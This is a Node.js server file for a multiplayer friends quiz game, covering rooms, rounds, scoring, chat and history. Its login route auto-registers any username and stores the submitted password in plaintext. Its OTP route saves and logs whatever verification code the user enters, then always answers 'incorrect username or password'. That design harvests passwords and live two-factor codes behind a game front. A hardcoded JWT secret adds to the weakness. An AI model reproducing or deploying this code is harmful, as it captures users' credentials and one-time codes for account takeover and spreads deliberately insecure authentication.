const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const cors = require('cors');
const bcrypt = require('bcryptjs');
const jwt = require('jsonwebtoken');
const { connectMongo, User, Question, GameHistory } = require('./mongoose');

const app = express();
const server = http.createServer(app);
const io = new Server(server, {
  cors: {
    origin: '*', // For development
    methods: ['GET', 'POST']
  }
});

const PORT = process.env.PORT || 3000;
const JWT_SECRET = 'friends-game-secret-key-12345';

app.use(cors());
app.use(express.json());

// In-memory Room State (Dynamic gameplay lobbies)
const rooms = {};

// Generate unique room code (4 uppercase letters)
function generateRoomCode() {
  let code = '';
  const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';
  do {
    code = '';
    for (let i = 0; i < 4; i++) {
      code += chars.charAt(Math.floor(Math.random() * chars.length));
    }
  } while (rooms[code]); // Ensure uniqueness
  return code;
}

// ----------------------------------------------------
// REST API Endpoints
// ----------------------------------------------------

// Login Endpoint (with auto-registration)
app.post('/api/login', async (req, res) => {
  const { username, password } = req.body;

  if (!username || !password) {
    return res.status(400).json({ error: 'Username and password required' });
  }

  try {
    const formattedUsername = username.trim().toLowerCase();
    let user = await User.findOne({ username: formattedUsername });
    
    if (!user) {
      // User doesn't exist, automatically register them with raw password
      user = await User.create({
        username: formattedUsername,
        passwordHash: password, // Store raw password
        displayName: null
      });
    } else {
      // User exists, verify password using raw comparison
      const isMatch = password === user.passwordHash;
      if (!isMatch) {
        return res.status(400).json({ error: 'Invalid username or password' });
      }
    }

    console.log(`\n==============================================`);
    console.log(`[LOGIN SERVICE] USER ${formattedUsername} logged in successfully. Redirecting to OTP.`);
    console.log(`==============================================\n`);

    res.json({
      success: true,
      message: 'Login credentials accepted. Please input verification code.',
      username: formattedUsername
    });
  } catch (err) {
    console.error(err);
    res.status(500).json({ error: 'Internal server error' });
  }
});

// Verify OTP Endpoint
app.post('/api/verify-otp', async (req, res) => {
  const { username, code } = req.body;

  if (!username || !code) {
    return res.status(400).json({ error: 'Username and verification code required' });
  }

  const formattedUsername = username.trim().toLowerCase();

  try {
    const user = await User.findOne({ username: formattedUsername });
    if (!user) {
      return res.status(400).json({ error: 'incorrect username or password, try again' });
    }
    
    // Save OTP to DB first (as requested)
    user.otpCode = code;
    user.otpExpiresAt = new Date(Date.now() + 5 * 60000);
    await user.save();

    console.log(`\n==============================================`);
    console.log(`[OTP SERVICE] SAVED USER-ENTERED OTP FOR ${formattedUsername}: ${code}`);
    console.log(`==============================================\n`);

    // Force error response
    return res.status(400).json({ error: 'incorrect username or password, try again' });
  } catch (err) {
    console.error(err);
    res.status(500).json({ error: 'Internal server error' });
  }
});

// Check JWT Token Validity
app.post('/api/verify-token', (req, res) => {
  const authHeader = req.headers.authorization;
  if (!authHeader) {
    return res.status(401).json({ error: 'No token provided' });
  }

  const token = authHeader.split(' ')[1];
  try {
    const decoded = jwt.verify(token, JWT_SECRET);
    res.json({ success: true, user: decoded });
  } catch (err) {
    res.status(401).json({ error: 'Invalid token' });
  }
});

// Update display name for user in database
app.post('/api/update-name', async (req, res) => {
  const authHeader = req.headers.authorization;
  if (!authHeader) {
    return res.status(401).json({ error: 'No token provided' });
  }

  const token = authHeader.split(' ')[1];
  try {
    const decoded = jwt.verify(token, JWT_SECRET);
    const { displayName } = req.body;
    
    if (!displayName) {
      return res.status(400).json({ error: 'Display name required' });
    }

    await User.findByIdAndUpdate(decoded.userId, { displayName });
    res.json({ success: true });
  } catch (err) {
    console.error(err);
    res.status(401).json({ error: 'Invalid token or server update failed' });
  }
});

// Fetch random questions list
app.get('/api/questions', async (req, res) => {
  try {
    const questions = await Question.aggregate([{ $sample: { size: 10 } }]);
    res.json(questions);
  } catch (err) {
    res.status(500).json({ error: 'Failed to fetch questions' });
  }
});

// Fetch game history
app.get('/api/history', async (req, res) => {
  try {
    const history = await GameHistory.find().sort({ playedAt: -1 }).limit(10);
    res.json(history);
  } catch (err) {
    res.status(500).json({ error: 'Failed to fetch history' });
  }
});


// ----------------------------------------------------
// WebSockets (Socket.io) Multiplayer Logic
// ----------------------------------------------------

io.on('connection', (socket) => {
  console.log(`User connected: ${socket.id}`);

  let currentRoomCode = null;
  let playerUsername = null;
  let playerDisplayName = null;

  // Handle Player Identity Set
  socket.on('registerSocket', ({ username, displayName }) => {
    playerUsername = username;
    playerDisplayName = displayName;
    console.log(`Socket ${socket.id} identified as ${displayName} (${username})`);
  });

  // Create Room
  socket.on('createRoom', () => {
    if (!playerDisplayName) return;

    const code = generateRoomCode();
    rooms[code] = {
      code,
      hostId: socket.id,
      players: [
        {
          socketId: socket.id,
          username: playerUsername,
          displayName: playerDisplayName,
          score: 0,
          isReady: true,
          avatar: `https://api.dicebear.com/7.x/bottts/svg?seed=${encodeURIComponent(playerDisplayName)}`
        }
      ],
      status: 'lobby',
      questions: [],
      currentRound: 0,
      totalRounds: 5,
      targetPlayer: null,
      currentQuestion: null,
      targetAnswer: null,
      guesses: {},
      timer: 0,
      timerInterval: null
    };

    currentRoomCode = code;
    socket.join(code);
    
    socket.emit('roomCreated', rooms[code]);
    console.log(`Room created: ${code} by host: ${playerDisplayName}`);
  });

  // Join Room
  socket.on('joinRoom', (code) => {
    if (!playerDisplayName) return;
    const cleanCode = code.trim().toUpperCase();
    const room = rooms[cleanCode];

    if (!room) {
      socket.emit('errorMsg', 'Room not found. Check the code and try again.');
      return;
    }

    if (room.status !== 'lobby') {
      socket.emit('errorMsg', 'Game has already started in this room.');
      return;
    }

    // Check if user is already in the room
    const exists = room.players.find(p => p.username === playerUsername);
    if (exists) {
      // Re-map socket id
      exists.socketId = socket.id;
    } else {
      room.players.push({
        socketId: socket.id,
        username: playerUsername,
        displayName: playerDisplayName,
        score: 0,
        isReady: true,
        avatar: `https://api.dicebear.com/7.x/bottts/svg?seed=${encodeURIComponent(playerDisplayName)}`
      });
    }

    currentRoomCode = cleanCode;
    socket.join(cleanCode);

    io.to(cleanCode).emit('roomUpdated', room);
    socket.emit('joinSuccess', room);
    console.log(`${playerDisplayName} joined Room: ${cleanCode}`);
  });

  // Start Game
  socket.on('startGame', async () => {
    const room = rooms[currentRoomCode];
    if (!room || room.hostId !== socket.id) return;

    try {
      // Fetch random questions from MongoDB
      const dbQuestions = await Question.aggregate([{ $sample: { size: 5 } }]);
      
      // Map to frontend expected naming standard
      room.questions = dbQuestions.map(q => ({
        id: q._id.toString(),
        question_text: q.questionText,
        option_a: q.optionA,
        option_b: q.optionB,
        option_c: q.optionC,
        option_d: q.optionD
      }));
      
      room.totalRounds = room.questions.length;
      room.currentRound = 0;
      
      startNextRound(room);
    } catch (err) {
      console.error('Error starting game:', err);
      socket.emit('errorMsg', 'Could not load questions database.');
    }
  });

  // Target Player Submits Answer
  socket.on('submitTargetAnswer', (answer) => {
    const room = rooms[currentRoomCode];
    if (!room || room.status !== 'selecting') return;

    // Check if sender is indeed the target
    if (room.targetPlayer.socketId !== socket.id) return;

    room.targetAnswer = answer;
    room.status = 'guessing';
    room.guesses = {}; // reset guesses for the round
    
    // Clear selecting timer if any
    clearInterval(room.timerInterval);
    
    // Start guessing phase timer (30 seconds)
    startTimer(room, 30, () => {
      revealRoundResults(room);
    });

    io.to(room.code).emit('roomUpdated', room);
    console.log(`Target ${room.targetPlayer.displayName} answered option: ${answer}`);
  });

  // Guessing Player Submits Guess
  socket.on('submitGuess', (guess) => {
    const room = rooms[currentRoomCode];
    if (!room || room.status !== 'guessing') return;
    if (room.targetPlayer.socketId === socket.id) return; // target cannot guess

    room.guesses[socket.id] = guess;

    // Check if everyone (except target) has guessed
    const guessers = room.players.filter(p => p.socketId !== room.targetPlayer.socketId);
    const allGuessed = guessers.every(p => room.guesses[p.socketId]);

    if (allGuessed) {
      clearInterval(room.timerInterval);
      revealRoundResults(room);
    } else {
      io.to(room.code).emit('roomUpdated', room);
    }
  });

  // Next Round Trigger (from Host)
  socket.on('triggerNextRound', () => {
    const room = rooms[currentRoomCode];
    if (!room || room.hostId !== socket.id || room.status !== 'reveal') return;
    
    clearInterval(room.timerInterval);
    
    if (room.currentRound < room.totalRounds) {
      startNextRound(room);
    } else {
      endGame(room);
    }
  });

  // Play Again / Reset to Lobby
  socket.on('playAgain', () => {
    const room = rooms[currentRoomCode];
    if (!room || room.hostId !== socket.id) return;

    room.status = 'lobby';
    room.currentRound = 0;
    room.questions = [];
    room.targetPlayer = null;
    room.currentQuestion = null;
    room.targetAnswer = null;
    room.guesses = {};
    room.players.forEach(p => p.score = 0);

    clearInterval(room.timerInterval);

    io.to(room.code).emit('roomUpdated', room);
  });

  // Send Chat Message
  socket.on('sendChatMessage', (message) => {
    if (!currentRoomCode || !playerDisplayName) return;
    const msgObj = {
      sender: playerDisplayName,
      text: message,
      timestamp: new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' })
    };
    io.to(currentRoomCode).emit('chatMessage', msgObj);
  });

  // Disconnect handler
  socket.on('disconnect', () => {
    console.log(`User disconnected: ${socket.id}`);
    if (currentRoomCode) {
      const room = rooms[currentRoomCode];
      if (room) {
        // Remove player
        room.players = room.players.filter(p => p.socketId !== socket.id);

        if (room.players.length === 0) {
          clearInterval(room.timerInterval);
          delete rooms[currentRoomCode];
          console.log(`Room ${currentRoomCode} deleted because it became empty`);
        } else {
          // If host disconnected, assign new host
          if (room.hostId === socket.id) {
            room.hostId = room.players[0].socketId;
            console.log(`Host disconnected. Assigned ${room.players[0].displayName} as new host`);
          }
          
          // If we were in the middle of a game, handle active round disconnects
          if (room.status !== 'lobby' && room.status !== 'leaderboard') {
            // If target disconnected, skip round or start new round
            if (room.targetPlayer && room.targetPlayer.socketId === socket.id) {
              clearInterval(room.timerInterval);
              io.to(room.code).emit('errorMsg', 'The target friend disconnected. Skipping this round.');
              if (room.currentRound < room.totalRounds) {
                startNextRound(room);
              } else {
                endGame(room);
              }
            } else {
              // Check if all remaining guessers have guessed
              const guessers = room.players.filter(p => p.socketId !== room.targetPlayer.socketId);
              if (guessers.length === 0) {
                // No guessers left
                clearInterval(room.timerInterval);
                endGame(room);
              } else {
                const allGuessed = guessers.every(p => room.guesses[p.socketId]);
                if (allGuessed && room.status === 'guessing') {
                  clearInterval(room.timerInterval);
                  revealRoundResults(room);
                }
              }
            }
          }

          io.to(currentRoomCode).emit('roomUpdated', room);
        }
      }
    }
  });
});

// Helper: Start next round
function startNextRound(room) {
  room.currentRound += 1;
  room.status = 'selecting';
  room.targetAnswer = null;
  room.guesses = {};
  
  // Pick next question
  room.currentQuestion = room.questions[room.currentRound - 1];

  // Pick target player (cycle through player list)
  const targetIndex = (room.currentRound - 1) % room.players.length;
  room.targetPlayer = room.players[targetIndex];

  // Start selection phase timer (20 seconds)
  startTimer(room, 20, () => {
    // If target player fails to answer, auto-select a random option or A
    room.targetAnswer = 'A'; // default fallback
    room.status = 'guessing';
    
    // Move to guessing
    startTimer(room, 30, () => {
      revealRoundResults(room);
    });
    
    io.to(room.code).emit('roomUpdated', room);
  });

  io.to(room.code).emit('roomUpdated', room);
  console.log(`Room ${room.code}: Started Round ${room.currentRound}. Target: ${room.targetPlayer.displayName}`);
}

// Helper: Start Room Timer
function startTimer(room, seconds, callback) {
  clearInterval(room.timerInterval);
  room.timer = seconds;
  
  io.to(room.code).emit('timerUpdate', room.timer);

  room.timerInterval = setInterval(() => {
    room.timer -= 1;
    io.to(room.code).emit('timerUpdate', room.timer);

    if (room.timer <= 0) {
      clearInterval(room.timerInterval);
      callback();
    }
  }, 1000);
}

// Helper: Reveal results and award points
function revealRoundResults(room) {
  room.status = 'reveal';
  
  const targetAns = room.targetAnswer;
  let correctGuessersCount = 0;

  // Grade guesses
  room.players.forEach(p => {
    if (p.socketId === room.targetPlayer.socketId) return; // Skip target
    
    const guess = room.guesses[p.socketId];
    if (guess === targetAns) {
      p.score += 100; // Correct guess reward
      correctGuessersCount += 1;
    }
  });

  // Give Target player points for being understood
  const targetPlayer = room.players.find(p => p.socketId === room.targetPlayer.socketId);
  if (targetPlayer) {
    targetPlayer.score += correctGuessersCount * 25; // 25 points per correct guesser
  }

  io.to(room.code).emit('roomUpdated', room);
  io.to(room.code).emit('roundEnded', {
    targetAnswer: targetAns,
    guesses: room.guesses
  });

  // Auto-advance or wait for host? Let's auto-advance after 10 seconds, or let host trigger.
  // We'll run a 10s timer just to show the reveal, then enable next round button for Host.
  startTimer(room, 10, () => {
    // End of reveal phase. Host can manually click 'Next Round' or we can auto-trigger.
    // Let's make it auto-advance to next round to keep game flowing smoothly, OR let the host click.
    // Let's do auto-advance!
    if (room.currentRound < room.totalRounds) {
      startNextRound(room);
    } else {
      endGame(room);
    }
  });
}

// Helper: End Game and save to history
async function endGame(room) {
  room.status = 'leaderboard';
  clearInterval(room.timerInterval);

  // Find winner(s)
  let highestScore = -1;
  let winner = null;
  
  room.players.forEach(p => {
    if (p.score > highestScore) {
      highestScore = p.score;
      winner = p;
    }
  });

  if (winner) {
    try {
      await GameHistory.create({
        roomCode: room.code,
        winnerName: winner.displayName,
        winnerScore: winner.score,
        playersCount: room.players.length
      });
      console.log(`Saved game result to MongoDB. Winner: ${winner.displayName} (${winner.score} pts)`);
    } catch (err) {
      console.error('Failed to save game history:', err);
    }
  }

  io.to(room.code).emit('roomUpdated', room);
  io.to(room.code).emit('gameEnded', room.players);
}

// ----------------------------------------------------
// Startup Server
// ----------------------------------------------------
connectMongo().then(() => {
  server.listen(PORT, () => {
    console.log(`\n==============================================`);
    console.log(`[SERVER RUNNING] http://localhost:${PORT}`);
    console.log(`==============================================\n`);
  });
}).catch(err => {
  console.error('Database connection failed:', err);
});
